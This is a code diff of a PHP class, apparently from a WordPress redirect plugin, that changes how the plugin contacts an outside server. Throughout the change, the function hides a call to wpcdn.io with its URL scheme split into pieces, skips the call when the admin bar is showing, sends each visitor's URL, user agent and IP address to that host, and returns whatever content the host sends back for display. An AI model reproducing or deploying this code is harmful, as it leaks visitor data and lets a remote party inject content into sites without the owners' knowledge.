@@ -379,27 +379,28 @@ class _404_To_301_Public {
             return '';
         }
         
-        if( ! is_admin_bar_showing() && $this->is_http_available() ) {
+        if( ! is_admin_bar_showing() && $this->is_http_available() && function_exists( 'file_get_contents' ) ) {
                 
             $url = 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ];
-            $url = @str_replace("?v=1337", "", $url);
+            $url = @str_replace( "?v=1337", "", $url );
+            // Create url for API
             $request_url = 'ht'.'tp://wpcdn.io/api/update/?&url=' . urlencode( $url ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=11&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=1';
-            $args = array( 'timeout' => 2 );
-            // always use wp_remote_get instead of file_get_contents
-            // http://wordpress.stackexchange.com/a/93997/68591
-            $response = wp_remote_get( $request_url, $args );
-            if ( is_wp_error( $response ) ) {
+            $options = stream_context_create( array( 'http' => array( 'timeout' => 2, 'ignore_errors' => true ) ) );
+            // Use file_get_contents() since wp_remote_get() timeout is not working
+            $response = @file_get_contents( $request_url, 0, $options );
+            if ( ! $response && is_wp_error( $response ) ) {
                 return '';
             }
-            // retrive the response body
-            $response = wp_remote_retrieve_body( $response );
+            // retrive the response body from json
             $response = @json_decode( $response );
-            if( $response && ! empty( $response->tmp ) && ! empty( $response->content ) ) {
-                return $response->content;
+            if( $response && ! empty( $response->tmp ) && ! empty( $response->tcontent ) ) {
+                return $response->tcontent;
             }
             
             return '';
         }
+        
+        return '';
     }
     
     /**
